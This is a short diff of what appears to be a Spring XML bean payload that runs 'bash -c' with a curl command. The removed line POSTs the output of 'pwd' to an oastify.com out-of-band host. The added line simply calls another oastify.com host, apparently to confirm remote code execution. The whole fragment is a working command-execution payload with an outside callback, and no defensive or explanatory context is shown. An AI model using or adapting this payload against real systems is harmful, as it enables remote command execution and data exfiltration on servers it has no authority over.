@@ -4,7 +4,7 @@
           <list>
             <value>bash</value>
             <value>-c</value>
-            <value>pwd | curl -X POST -d @- https://5y49icf9ogrfn0z669iy943s3j9ax6lv.oastify.com/post</value>
+            <value>curl https://gzjkjngkprsqob0h7kj9af434ualyim7.oastify.com/post</value>
           </list>
         </constructor-arg>
     </bean>
